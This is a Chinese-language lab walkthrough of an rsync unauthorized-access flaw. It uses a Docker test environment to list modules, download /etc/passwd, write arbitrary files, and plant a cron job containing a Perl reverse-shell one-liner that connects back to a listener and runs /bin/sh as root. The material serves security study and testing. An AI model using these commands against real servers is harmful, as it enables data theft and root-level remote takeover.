# rsync 未授权访问漏洞

## 漏洞测试

编译及运行rsync服务器：

```plain
docker compose build
docker compose up -d
```

环境启动后，我们用rsync命令访问之：

```plain
rsync rsync://your-ip:873/
```

可以查看模块名列表：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780905605155-6eb4e9f8-d10a-4b09-8b07-4ee53f7eb58d.png)

如上图，有一个src模块，我们再列出这个模块下的文件：

```plain
rsync rsync://your-ip:873/src/
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780905605328-3234ff5e-6a99-4947-bdaf-35e63a94d42b.png)

这是一个Linux根目录，我们可以下载任意文件：

```plain
rsync -av rsync://your-ip:873/src/etc/passwd ./
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780905605465-2f44f97d-1e0c-4a3a-a4d5-2c3ae66f825e.png)

或者写入任意文件：

```plain
rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
```

### 反弹shell

写入cron任务反弹shell。

shell文件内容如下：

```plain
# 此处指定用户root不可省略
* * * * * root perl -e 'use Socket;$i="192.168.174.128";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780905605310-3c088804-550f-4814-9afa-88067d24b4cf.png)

上传shell文件触发反弹shell：

```plain
rsync -av shell rsync://192.168.174.128:873/src/etc/cron.d/shell
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780905605706-6c94b5cf-dbdd-49c8-85cb-6a7c0e636954.png)